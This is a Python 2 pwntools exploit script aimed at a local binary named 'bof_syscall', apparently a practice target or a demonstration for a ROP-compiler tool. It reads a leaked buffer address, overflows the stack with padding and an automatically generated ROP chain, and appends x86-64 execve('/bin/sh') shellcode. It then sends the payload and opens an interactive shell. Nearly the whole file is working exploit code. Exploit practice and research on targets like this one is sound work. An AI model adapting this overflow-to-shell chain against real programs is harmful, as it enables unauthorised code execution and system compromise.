import sys, logging
from pwn import *
from rop_compiler import ropme

filename = './bof_syscall'
p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40063f\nbreak *0x400641\nbreak *0x400643")

line = p.readline()
buffer_address = int(line.split(":")[1],16)

shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
    "\x48\x31\xd2"                                  # xor    %rdx, %rdx
 +  "\x48\x31\xc0"                                  # xor    %rax, %rax
 +  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
 +  "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
 +  "\x53"                                          # push   %rbx
 +  "\x48\x89\xe7"                                  # mov    %rsp, %rdi
 +  "\x50"                                          # push   %rax
 +  "\x57"                                          # push   %rdi
 +  "\x48\x89\xe6"                                  # mov    %rsp, %rsi
 +  "\xb0\x3b"                                      # mov    $0x3b, %al
 +  "\x0f\x05"                                      # syscall
)
target_address = buffer_address + 1024
print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)

rop = ropme.rop_to_shellcode([(filename, None, None)], [], target_address)

payload = 'A'*512 + 'B'*8 + rop
payload += ((1024 - len(payload)) * 'B') + shellcode

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
